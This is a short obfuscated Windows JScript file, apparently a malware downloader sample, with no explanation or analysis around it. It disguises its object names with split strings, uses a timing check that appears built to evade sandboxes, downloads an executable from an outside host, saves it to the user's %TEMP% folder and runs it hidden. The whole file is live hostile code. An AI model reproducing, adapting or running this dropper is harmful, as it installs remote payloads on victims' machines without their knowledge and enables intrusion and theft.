var U = false;
var A = "Create"+"Object";
var TH = function BA() {return WScript[A]("WScript"+".Shell");}(), WP = 11;
var ZM = "MSXML2"+".XMLHTTP";
var BE = 2;
var XO = BE - 2;
function I(IG){TH["Run"](IG, XO, XO);};
function TO(){return ZM + "";};
function V(N, UB){XO = XO * 1; return N - UB;};
function VY(){return A;};
/*@cc_on
  @if (@_win32 || @_win64)
    U = true;
  @end
@*/
if (U)
{
var G = "";
function KX(){return 22;};
var PH = 0; var W = 0;
function XI()
{
var IH = new this["Date"]();
var BS = IH["getUTCMilliseconds"]();
WScript["Sleep"](KX());
var IH = new this["Date"]();
var P = IH["getUTCMilliseconds"]();
WScript["Sleep"](KX());
var IH = new this["Date"]();
var SU = IH["getUTCMilliseconds"]();
var PH = "J";
PH = V(P, BS);
var W = "RI";
W = V(SU, P);
G = "open";
return V(PH, W);
}
var B = false;
var R = false;
for (var OE = XO; OE < KX() * 1; OE++){if (XI() != XO){
B = true; 
W = "31" + 11 * PH + W; 
R = true; 
break;
}}
function SO() {return ((B == true) && (B == R)) ? 1 : XO;};
if (B && SO() && R){
function F() {return TH["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2chbYkBEyZBdSgb.ex" + "e";};
 WT = TO();
 Y = WScript[A](WT);
 var S = 1;
do { 
	for (;S;){
	try {
		if (S == 1)
		{
			Y[G]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			Y["send"]();
			I0 = "Sleep";
			S = 2;
		}
		WScript[I0](KX() + 120); 
		if (Y["readystate"] < 2 * 2) continue;
		S = XO;
		function NE(BO) {var IM = (1, 2, 3, 4, 5, BO); return IM;};
		JT = WScript[VY()]("ADODB.Stream");
		WT = JT;
		WT[G]();
		WT["type"] = NE(1);
		WT["write"](Y["ResponseBody"]);
		JT["position"] = NE(XO);
		WT["Save" + "ToFile"](F(), 2);
		JT["cl"+"ose"]();
		TF = F();
		I(TF);
	} catch(MT){};};
}while (S);
}
}

